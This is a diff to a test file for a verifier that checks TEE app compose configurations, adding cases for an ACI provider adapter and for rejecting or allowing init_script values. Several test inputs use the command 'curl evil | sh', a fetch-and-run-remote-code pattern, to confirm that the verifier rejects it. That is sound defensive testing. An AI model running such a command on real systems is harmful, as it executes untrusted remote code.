@@ -37,6 +37,14 @@ describe('checkAppCompose', () => {
     expect(checkAppCompose(app, composeHash(app + ' '), [TEST_IMAGE])).toEqual({ error: 'app compose does not match the measured compose hash' })
   })
 
+  it('accepts the ACI adapter with its attestation URL as a literal provider setting', () => {
+    const compose = withService((s) => {
+      s['environment']['ANTSEED_VERIFIER_PROVIDER_ADAPTER'] = 'aci'
+      s['environment']['ANTSEED_VERIFIER_PROVIDER_ACI_URL'] = 'https://provider.example/v1/aci/attestation'
+    })
+    expect(checkCompose(compose)).not.toHaveProperty('error')
+  })
+
   it('rejects an image that is not an approved Antseed image', () => {
     expect(checkAppCompose(appCompose(referenceCompose()), composeHash(appCompose(referenceCompose())), [])).toMatchObject({ error: expect.stringMatching(/not an approved Antseed TEE seller image/) })
     expect(checkCompose(withService((s) => { s['image'] = 'ghcr.io/antseed/tee-seller:latest' }))).toMatchObject({ error: 'service image must be pinned by digest' })
@@ -52,7 +60,10 @@ describe('checkAppCompose', () => {
     expect(checkCompose(referenceCompose(), { public_logs: true })).not.toHaveProperty('error')
     // Phala Cloud sets it; it only stops the CVM from booting without the matching launch token.
     expect(checkCompose(referenceCompose(), { launch_token_hash: 'ab'.repeat(32) })).not.toHaveProperty('error')
-    expect(checkCompose(referenceCompose(), { init_script: ['curl evil | sh'] })).toMatchObject({ error: expect.stringMatching(/init_script is not allowed/) })
+    expect(checkCompose(referenceCompose(), { init_script: ['curl evil | sh'] })).toMatchObject({ error: expect.stringMatching(/init script/) })
+    expect(checkCompose(referenceCompose(), { init_script: 'curl evil | sh' })).toMatchObject({ error: expect.stringMatching(/init script/) })
+    // Phala Cloud's CLI always writes the key, empty when the app has no init scripts.
+    for (const empty of [[], '', null]) expect(checkCompose(referenceCompose(), { init_script: empty })).not.toHaveProperty('error')
     expect(checkCompose(referenceCompose(), { runner: 'bash', bash_script: 'x' })).toMatchObject({ error: expect.stringMatching(/bash_script is not allowed/) })
     expect(checkCompose(referenceCompose(), { runner: 'bash' })).toMatchObject({ error: expect.stringMatching(/docker compose/) })
   })
